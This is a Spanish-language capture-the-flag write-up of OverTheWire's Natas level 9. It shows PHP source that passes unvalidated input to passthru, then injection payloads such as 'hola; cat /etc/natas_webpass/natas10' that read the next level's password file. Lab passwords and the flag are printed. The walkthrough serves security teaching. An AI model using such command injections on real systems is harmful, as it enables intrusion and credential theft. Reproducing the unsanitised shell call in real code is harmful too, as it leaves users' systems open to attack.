#Natas Level 8 → Level 9

Username: natas9

URL:      http://natas9.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas9.natas.labs.overthewire.org** 
- **Usuario    : natas9**
- **Contraseña : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl**

La contraseña la hemos sacado del nivel anterior.

Entramos a la página web y observamos que tenemos un **formulario** en el que nos pide que pongamos un **texto** en algún sitio para que lo muestre en el parámetro **output**

Lo primero que hacemos es abrir el **código fuente** y miramos que es lo que hace

```html
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
````

Observamos que recoge el valor que hemos introducido y si no está vacio ejecuta el comando:

```php
 passthru("grep -i $key dictionary.txt");
```

El comando **passthru** en **PHP** es muy parecido al comando **exec()** ya que ejecuta un programa externo y muestra la salida en bruto.

En este caso con el valor que hemos introducido anteriormente **$key** realiza un **grep -i** al fichero de texto **dictionary.txt**

Probablemente esté ahí la contraseña del siguiente nivel. Tenemos que conseguir que nos devuelva todo el contenido del fichero.

Ejecutamos el siguiente comando **'^'** para que nos devuelva todo el contenido y el comando **grep** quede de esta manera

```php
grep -i '^' dictionary.txt
```

El comando **'^'** indica una nueva linea por lo que si el fichero tiene nueva linea nos devolverá el valor. Podríamos haber utilizado el valor **''** pero en este caso nos pedían no introducir una **$key** vacia

```html
Output:

African
Africans
Allah
Allah's
American
Americanism
...
zucchini's
zucchinis
Ã©clair
Ã©clair's
Ã©clairs
```

Observamos que no aparece ahí la contraseña :cry: 

Hemos comentado que el programa recoge el valor del input y lo ejecuta como si fuera un **exec()**. 

¿Podremos hacer una injección de código?

Vamos a ver el comando que tenemos y como lo podríamos modificar para que nos muestre lo que sea.

```php
 passthru("grep -i $key dictionary.txt");
```

Si introducimos como input **$key** lo siguiente funcionará?

**hola; ls -l** 

```php
Output:
-rw-r----- 1 natas9 natas9 460878 Jun 25 12:18 dictionary.txt
```

Ou yeah! :sunglasses: No valida el input y ejecuta lo que le pongamos, así que nos ponemos manos a la obra para encontrar la contraseña por el directorio.

Vamos probando a cambiar de directorios y que vaya mostrando el contenido del mismo:

```php
hola; ls -l; cd ..;
```

Vamos jugando con los párametros y viendo los resultados que nos muestra hasta que llegamos a un directorio interesante

```php
/etc/natas_webpass
```

Nosotros necesitamos la password del siguiente nivel **natas10** por lo que vamos al directorio **natas10**

```php
/etc/natas_webpass/natas10
```

Montamos el comando:

```php
hola; echo /etc/natas_webpass/natas10
```

Nos devuelve el siguiente **Output**

```html
Output:
/etc/natas_webpass/natas10 dictionary.txt
```

Vamos a ver el contenido de ese fichero **dictionary.txt**

```php
hola; cat /etc/natas_webpass/natas10
```

Esta vez nos devuelve todo el contenido del fichero **dictionary.txt** con un contenido adicional

```php
Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

African
Africans
Allah
Allah's
American
...
```

Nos devulevel tambien la contraseña del siguiente nivel :smile:

**FLAG** = {nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu}



